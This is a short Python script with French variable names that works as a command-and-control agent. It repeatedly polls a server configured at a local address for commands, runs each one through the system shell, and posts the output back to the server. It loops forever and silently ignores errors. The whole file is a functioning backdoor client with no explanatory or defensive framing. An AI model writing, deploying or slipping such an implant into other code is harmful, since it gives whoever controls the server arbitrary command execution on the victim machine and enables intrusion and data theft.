import requests
import subprocess
import time

serveur_c2 = "http://127.0.0.1:8080"
ancienne_commande = ""

while True:
    try:
        commande = requests.get(f"{serveur_c2}/recuperer_commande").text.strip()
        if commande and commande != ancienne_commande:
            ancienne_commande = commande
            try:
                resultat = subprocess.run(commande, shell=True, capture_output=True, text=True, timeout=5)
                if resultat.stdout:
                    sortie = resultat.stdout
                else:
                    sortie = resultat.stderr
            except subprocess.TimeoutExpired:
                sortie = "Temps d'exécution dépassé"
            requests.post(f"{serveur_c2}/envoyer_resultat", data=sortie.encode('utf-8'))
    except:
        pass
    time.sleep(2)
